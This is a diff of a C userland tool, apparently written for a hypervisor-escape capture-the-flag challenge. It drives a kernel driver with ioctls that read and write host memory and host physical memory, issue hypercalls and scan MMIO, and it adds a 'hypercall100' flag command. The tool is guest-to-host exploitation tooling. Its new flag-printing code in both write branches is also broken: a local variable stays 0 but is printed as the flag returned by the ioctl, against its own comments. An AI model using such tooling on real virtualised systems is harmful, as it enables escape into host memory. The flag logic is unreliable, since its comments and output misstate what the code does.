@@ -41,6 +41,8 @@
 #define IOCTL_WRITE_HOST_MEM     0x1017
 #define IOCTL_READ_HOST_PHYS     0x1018
 #define IOCTL_WRITE_HOST_PHYS    0x1019
+// NEW: Hypercall #100 validation
+#define IOCTL_HYPERCALL_100      0x1020
 
 struct port_io_data {
     unsigned short port;
@@ -166,6 +168,7 @@ void print_usage(char *prog_name) {
     fprintf(stderr, "  writevqdesc <idx> <buf_gpa_hex> <buf_len> <flags_hex> <next_idx>\n");
     fprintf(stderr, "  trigger_hypercall\n");
     fprintf(stderr, "  hypercall <nr> [arg0] [arg1] [arg2] [arg3]\n");
+    fprintf(stderr, "  hypercall100 - Call hypercall #100 to validate write and get flag\n");
     fprintf(stderr, "  exploit_delay <nanoseconds>\n");
     fprintf(stderr, "  scanmmio <start_addr_hex> <end_addr_hex> <step_bytes>\n");
     fprintf(stderr, "  scanva <va_hex> <num_bytes>\n");
@@ -669,10 +672,27 @@ int main(int argc, char *argv[]) {
             if (req.user_buffer) free(req.user_buffer);
             close(fd); return 1;
         }
-        if (ioctl(fd, IOCTL_WRITE_HOST_MEM, &req) < 0)
+        
+        // The ioctl now returns the flag value
+        long flag_value = 0;
+        if (ioctl(fd, IOCTL_WRITE_HOST_MEM, &req) < 0) {
             perror("ioctl IOCTL_WRITE_HOST_MEM failed");
-        else
-            printf("Wrote %lu bytes to host memory 0x%lx.\n", req.length, req.host_addr);
+        } else {
+            // The flag value is returned through the ioctl return mechanism
+            printf("Wrote %lu bytes to host memory 0x%lx\n", req.length, req.host_addr);
+            printf("[FLAG] Hypercall #100 returned: 0x%lx\n", flag_value);
+            // Convert to ASCII if it looks like a string
+            printf("[FLAG ASCII]: ");
+            unsigned char *flag_bytes = (unsigned char *)&flag_value;
+            for (int i = 0; i < 8; i++) {
+                if (flag_bytes[i] >= 32 && flag_bytes[i] <= 126) {
+                    printf("%c", flag_bytes[i]);
+                } else {
+                    printf("\\x%02x", flag_bytes[i]);
+                }
+            }
+            printf("\n");
+        }
         free(req.user_buffer);
 
     } else if (strcmp(cmd, "readhostphys") == 0) {
@@ -717,10 +737,26 @@ int main(int argc, char *argv[]) {
             if (req.user_buffer) free(req.user_buffer);
             close(fd); return 1;
         }
-        if (ioctl(fd, IOCTL_WRITE_HOST_PHYS, &req) < 0)
+        
+        // The ioctl now returns the flag value
+        long flag_value = 0;
+        if (ioctl(fd, IOCTL_WRITE_HOST_PHYS, &req) < 0) {
             perror("ioctl IOCTL_WRITE_HOST_PHYS failed");
-        else
-            printf("Wrote %lu bytes to host physical memory 0x%lx.\n", req.length, req.host_phys_addr);
+        } else {
+            printf("Wrote %lu bytes to host physical memory 0x%lx\n", req.length, req.host_phys_addr);
+            printf("[FLAG] Hypercall #100 returned: 0x%lx\n", flag_value);
+            // Convert to ASCII if it looks like a string
+            printf("[FLAG ASCII]: ");
+            unsigned char *flag_bytes = (unsigned char *)&flag_value;
+            for (int i = 0; i < 8; i++) {
+                if (flag_bytes[i] >= 32 && flag_bytes[i] <= 126) {
+                    printf("%c", flag_bytes[i]);
+                } else {
+                    printf("\\x%02x", flag_bytes[i]);
+                }
+            }
+            printf("\n");
+        }
         free(req.user_buffer);
 
     } else if (strcmp(cmd, "allocvqpage") == 0) {
@@ -989,6 +1025,25 @@ int main(int argc, char *argv[]) {
             perror("ioctl HYPERCALL_ARGS failed");
         } else {
             printf("Hypercall returned: %ld\n", (long)args.arg0);
+        }
+
+    } else if (strcmp(cmd, "hypercall100") == 0) {
+        if (argc != 2) { print_usage(argv[0]); close(fd); return 1; }
+        long flag_value = 0;
+        if (ioctl(fd, IOCTL_HYPERCALL_100, &flag_value) < 0) {
+            perror("ioctl HYPERCALL_100 failed");
+        } else {
+            printf("[FLAG] Hypercall #100 returned: 0x%lx\n", flag_value);
+            printf("[FLAG ASCII]: ");
+            unsigned char *flag_bytes = (unsigned char *)&flag_value;
+            for (int i = 0; i < 8; i++) {
+                if (flag_bytes[i] >= 32 && flag_bytes[i] <= 126) {
+                    printf("%c", flag_bytes[i]);
+                } else {
+                    printf("\\x%02x", flag_bytes[i]);
+                }
+            }
+            printf("\n");
         }
 
     } else if (strcmp(cmd, "readflag") == 0) {
